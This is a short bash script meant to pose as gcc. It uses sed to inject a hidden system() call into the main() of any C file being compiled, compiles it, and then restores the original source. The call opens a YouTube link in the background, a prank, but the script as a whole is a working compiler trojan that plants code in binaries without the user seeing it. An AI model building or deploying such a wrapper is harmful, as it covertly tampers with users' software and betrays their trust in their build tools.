#!/bin/bash

include="#include <stdlib.h>"

payload="
system(\"xdg-open \\'https://www.youtube.com/watch?v=o-YBDTqX_ZU\\' > /dev/null 2>/dev/null &\");\n
"

gcc=$(whereis $0 | cut -d " " -f2) 
patched_file=()

function patch {
	main=$(grep -n "main" $1)
	line=$(echo $main | cut -d ":" -f1)
	is_next=$(echo $main | grep "{" || echo 0)

	if [ $is_next -eq 0 ]; then 
		found_curly=$(grep -n "{" $1 | cut -d ":" -f1)
		while true
		do
			if echo ${found_curly[@]} | grep -q -w "$line"; then
				sed -i "1a\ $(echo $include)" $1
				line=$(($line + 1))
				sed -i "${line}a\ $(echo $payload)" $1	
				break 
			else
				line=$(($line + 1))
			fi
		done
	fi
}

if [ $# -lt 1 ]; then 
	$gcc
	exit 1
fi

for arg in $@ 
do
	if [ -f $arg ]; then 
		cp $(pwd)/$arg $(pwd)/.$arg
		patch $(pwd)/$arg
		patched_file+=($arg)
	fi
done

$gcc $@

for file in $patched_file 
do
	mv $(pwd)/.$file $(pwd)/$file
done

